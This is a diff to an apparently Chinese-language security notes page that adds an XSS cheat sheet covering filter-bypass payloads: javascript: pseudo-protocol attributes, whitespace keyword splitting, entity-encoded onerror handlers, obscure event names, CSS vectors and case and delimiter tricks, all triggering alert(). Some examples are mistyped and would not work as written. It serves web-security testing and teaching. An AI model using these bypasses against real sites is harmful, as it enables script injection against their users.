@@ -18,7 +18,166 @@
 <div class="clearfix"></div>
 <div id="title">XSS</div>
   <div id="content">
-  <p>把”&lt;&gt;”这两个字符html实体化之后，XSS是无法绕过</p>
+  <h2 id="xss-cheat-sheet">xss cheat sheet</h2>
+<p>xss cheat sheet 即测试xss的测试样表</p>
+<div class="hlcode"><pre><span class="nt">&lt;script&gt;</span>alert(1);<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;script&gt;</span>alert(&#39;xss&#39;);<span class="nt">&lt;/script&gt;</span>
+</pre></div>
+
+
+<h2 id="xss">xss 过滤绕过</h2>
+<ul>
+<li>&lt;&gt; </li>
+</ul>
+<div class="hlcode"><pre><span class="nt">&lt;scirpt&gt;</span>alert(1);<span class="nt">&lt;/script&gt;</span>
+</pre></div>
+
+
+<p>对 &lt;&gt; 或 &lt; script &gt; 进行过滤或转义，可以防御此类xss </p>
+<ul>
+<li>HTML标签属性执行XSS</li>
+</ul>
+<p>很多HTML标签属性支持 javascipt:[code] 伪协议的形式。这个协议类型声明了URL的主体是任意的JavaScript代码，由javascript的解释器运行</p>
+<div class="hlcode"><pre><span class="nt">&lt;table</span> <span class="na">background=</span><span class="s">&quot;javascript:alert(/xss/)&quot;</span><span class="nt">&gt;&lt;/table&gt;</span>
+<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;javascript:alert(&#39;xss&#39;);&quot;</span><span class="nt">&gt;</span>
+</pre></div>
+
+
+<blockquote>
+<p>并不是所有的浏览器都支持javascript伪协议</p>
+</blockquote>
+<p>并不是所有的标记的属性都可以产生XSS，通常只有引用文件的属性才能触发XSS。</p>
+<div class="hlcode"><pre><span class="n">href</span><span class="o">=</span>
+<span class="n">lowsrc</span><span class="o">=</span>
+<span class="n">bgsound</span><span class="o">=</span>
+<span class="n">background</span><span class="o">=</span>
+<span class="n">value</span><span class="o">=</span>
+<span class="n">action</span><span class="o">=</span>
+<span class="n">dynsrc</span><span class="o">=</span>
+</pre></div>
+
+
+<ul>
+<li>空格 换行 Tab</li>
+</ul>
+<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;javas cript:alert(/xss/)&quot;</span> <span class="n">width</span><span class="o">=</span><span class="mi">100</span><span class="o">&gt;</span>
+</pre></div>
+
+
+<blockquote>
+<p>javas 和 cript是Tab</p>
+</blockquote>
+<p>关键字拆分绕过过滤限制，使用Tab, 空格， 换行。原因分析如下：</p>
+<p>javascript语句通常以分号结尾，如果一个语句是完整的，而这一行的结尾是换行符，就可以省略分号。如果同一行中有过个语句，则每个语句就必须使用分号来结束(最后一条语句可以不用分号)</p>
+<div class="hlcode"><pre><span class="n">var</span> <span class="n">a</span> <span class="o">=</span> <span class="nb">true</span>
+<span class="n">var</span> <span class="n">b</span> <span class="o">=</span> <span class="s">&quot;something&quot;</span><span class="p">;</span>
+</pre></div>
+
+
+<p>除了在引号中分隔单词或强制结束语句外，额外的空白无论以何种方式添加都无所谓。</p>
+<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;javas</span>
+<span class="nl">cript:</span>
+<span class="n">alert</span><span class="p">(</span><span class="o">/</span><span class="n">xss</span><span class="o">/</span><span class="p">)</span><span class="s">&quot;&gt;</span>
+</pre></div>
+
+
+<p>换行处不是一个完整语句时，js会继续处理发现的内容，直到遇到一个分号或发现完整的语句为止</p>
+<ul>
+<li>标签属性值转码</li>
+</ul>
+<p>编码绕过，HTML标记的属性值过滤，HTML <strong>属性</strong> 本身支持ASCII码形式, 转码支持十进制和十六进制。</p>
+<p>可以在十进制（十六进制）字符后面加 <strong>;</strong>, 还可以在前面加0, 如</p>
+<div class="hlcode"><pre><span class="o">&amp;</span><span class="err">#</span><span class="mi">0</span>
+<span class="o">&amp;</span><span class="err">#</span><span class="mo">00</span>
+<span class="o">&amp;</span><span class="err">#</span><span class="mo">000</span>
+<span class="o">&amp;</span><span class="err">#</span><span class="mo">0000</span>
+</pre></div>
+
+
+<div class="hlcode"><pre><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;a&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="s">&quot;aler&amp;#116(/xss/)&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="mi">1</span> <span class="n">onerror</span><span class="o">=</span><span class="s">&quot;aler&amp;#116;(/xss/)&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;a&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="s">&quot;&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#47&amp;#120&amp;#115&amp;#115&amp;#47&amp;#41&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;a&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="s">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#47;&amp;#41;&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;a&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="s">&quot;&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x2f&amp;#x78&amp;#x73&amp;#x73&amp;#x2f&amp;#x29&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;a&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="s">&quot;&amp;#000097&amp;#000108&amp;#000101&amp;#000114&amp;#000116&amp;#000040&amp;#000047&amp;#000120&amp;#000115&amp;#000115&amp;#000047&amp;#000041&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;a&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="s">&quot;&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#32&amp;#40&amp;#47&amp;#120&amp;#115&amp;#115&amp;#47&amp;#41&quot;</span><span class="o">&gt;</span>
+</pre></div>
+
+
+<p>注：</p>
+<div class="hlcode"><pre><span class="n">Tab</span><span class="p">(</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">9</span><span class="p">),</span> <span class="err">换行符</span><span class="p">(</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">10</span><span class="p">),</span> <span class="err">空格</span><span class="p">(</span><span class="o">&amp;</span><span class="err">#</span><span class="mi">32</span><span class="p">)</span><span class="err">可以被插入到代码中任意地方。</span>
+</pre></div>
+
+
+<ul>
+<li>产生自己的事件</li>
+</ul>
+<p>当不能依靠属性进行跨站时，可以使用事件。js和HTML之间的交互是通过事件来实现的，事件就是用户或浏览器自身执行的某种动作，如click, load等，而响应事件的函数叫做事件处理函数（或事件侦听器）。</p>
+<p>W3C将事件分为3个不同的类别：</p>
+<div class="hlcode"><pre><span class="err">用户接口</span><span class="p">(</span><span class="err">鼠标，键盘</span><span class="p">)</span>
+<span class="err">逻辑（处理的结果）</span>
+<span class="err">变化（对文档进行修改）</span>
+</pre></div>
+
+
+<p>测试事件型xss:</p>
+<div class="hlcode"><pre><span class="n">onResume</span>
+<span class="n">onReverse</span>
+<span class="n">onRowDelete</span>
+<span class="n">onRowInserted</span>
+<span class="n">onSeek</span>
+<span class="n">onSynchRestored</span>
+<span class="n">onTimeError</span>
+<span class="n">onTrackChange</span>
+<span class="n">onURLFlip</span>
+<span class="n">onRepeat</span>
+<span class="n">onMediaComplete</span>
+<span class="n">onMediaError</span>
+<span class="n">onPause</span>
+<span class="n">onProgress</span>
+<span class="n">onOutOfSync</span>
+<span class="n">onlayoutcomplete</span>
+<span class="n">onafterprint</span>
+<span class="n">onbeforeprint</span>
+<span class="n">ondataavailable</span>
+<span class="n">ondatasetchanged</span>
+<span class="n">ondatasetcomplete</span>
+<span class="n">onerrorupdate</span>
+<span class="n">onrowenter</span>
+<span class="n">onrowexit</span>
+<span class="n">onrowsdelete</span>
+<span class="n">onrowsinserted</span>
+<span class="n">onselectionchange</span>
+<span class="n">onbounce</span>
+<span class="n">onfinish</span>
+<span class="n">onstop</span>
+<span class="n">onresizeend</span>
+</pre></div>
+
+
+<ul>
+<li>CSS 跨站剖析</li>
+</ul>
+<p>xss另一个载体是CSS样式表，使用CSS样式表执行js具有隐蔽，灵活多变等特点，但其有个很大的缺点：各浏览器之间不能通用，甚者可能同一浏览器不同版本之间都不能通用</p>
+<div class="hlcode"><pre><span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">&quot;background-img:url(javascript:alert(&#39;xss&#39;))&quot;</span><span class="nt">&gt;</span>
+<span class="nt">&lt;style&gt;</span>
+    body {background-image: url{&quot;javascript:alert(&#39;xss&#39;)&quot;};}
+<span class="nt">&lt;/style&gt;</span>
+</pre></div>
+
+
+<h2 id="_1">常见绕过</h2>
+<div class="hlcode"><pre><span class="cp"># 大小写转换</span>
+<span class="o">&lt;</span><span class="n">IMG</span> <span class="n">sRc</span><span class="o">=</span><span class="s">&quot;a&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="s">&quot;alert(/xss/)&quot;</span><span class="o">&gt;</span>
+<span class="cp"># 单引号</span>
+<span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;a&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="err">&#39;</span><span class="n">alert</span><span class="p">(</span><span class="o">/</span><span class="n">xss</span><span class="o">/</span><span class="p">)</span><span class="err">&#39;</span><span class="o">&gt;</span>
+<span class="cp"># 不用引号</span>
+<span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;a&quot;</span> <span class="n">onerror</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="o">/</span><span class="n">xss</span><span class="o">/</span><span class="p">)</span><span class="o">&gt;</span>
+<span class="cp"># / 隔开</span>
+<span class="o">&lt;</span><span class="n">img</span><span class="o">/</span><span class="n">src</span><span class="o">=</span><span class="s">&quot;a&quot;</span><span class="o">/</span><span class="n">onerror</span><span class="o">=</span><span class="s">&quot;alert(/xss/)&quot;</span><span class="o">&gt;</span>
+<span class="cp"># </span><span class="cm">/**/</span><span class="cp"></span>
+<span class="o">&lt;</span><span class="n">img</span><span class="cm">/**/</span><span class="n">src</span><span class="o">=</span><span class="s">&quot;a&quot;</span><span class="cm">/**/</span><span class="n">onerror</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="o">/</span><span class="n">xss</span><span class="o">/</span><span class="p">)</span><span class="o">&gt;</span>
+</pre></div>
 </div>
 
         </div>
